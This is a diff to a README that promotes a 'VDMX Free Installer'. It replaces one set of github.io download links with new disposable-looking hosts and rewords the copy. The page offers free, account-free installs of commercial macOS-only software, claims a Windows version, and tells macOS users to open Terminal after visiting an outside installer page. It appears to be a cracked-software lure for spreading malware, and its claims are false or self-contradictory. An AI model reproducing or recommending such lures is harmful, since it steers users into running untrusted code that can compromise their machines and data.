@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-VJ+Software-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 VDMX Free Installer** — VDMX is a real-time video performance and VJ application for macOS. Works without internet access, no account required. Full offline installation.
+**💻 VDMX Free Installer** — VDMX is a professional macOS real-time video mixing and performance software. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About VDMX
 
-VDMX is a real-time video performance and VJ application for macOS. Mix video clips, generative visuals, and live camera feeds with effects, transitions, and MIDI/OSC control. Used by professional VJs, video artists, and installation designers for live performances and gallery installations, VDMX's modular, customizable architecture supports complex audiovisual performance setups.
+VDMX is a professional macOS real-time video mixing and performance software. Used by VJs and live performers, it provides a modular signal-chain approach with support for multiple video sources, effects, MIDI and OSC control, and Syphon output.
 
 ---
 
 ## ❌ Problem: VDMX is hard to access
 
-- **macOS Only** — No Windows or cross-platform version
-- **Commercial License** — Professional pricing targeting VJ industry
-- **Learning Curve** — Modular, highly configurable system requires significant learning investment
-- **Hardware Requirements** — Real-time video processing requires capable GPU and CPU
+- **macOS Only** — No Windows or Linux version
+- **High Cost** — Professional pricing targets working VJs and media artists
+- **Steep Learning Curve** — Modular signal routing paradigm takes significant time to master
+- **Niche Audience** — Specifically for live visual performance and video art
 
 ---
 
@@ -61,9 +61,9 @@ VDMX is a real-time video performance and VJ application for macOS. Mix video cl
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ VDMX is a real-time video performance and VJ application for macOS. Mix video cl
 
 <div align="center">
 
-[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ VDMX is a real-time video performance and VJ application for macOS. Mix video cl
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ VDMX is a real-time video performance and VJ application for macOS. Mix video cl
 
 ---
 
-**VDMX Free Installer** — VDMX is a real-time video performance and VJ application for macOS. Install without internet connection today!
+**VDMX Free Installer** — VDMX is a professional macOS real-time video mixing and performance software. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install VDMX](https://img.shields.io/badge/⬇_Install_VDMX-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
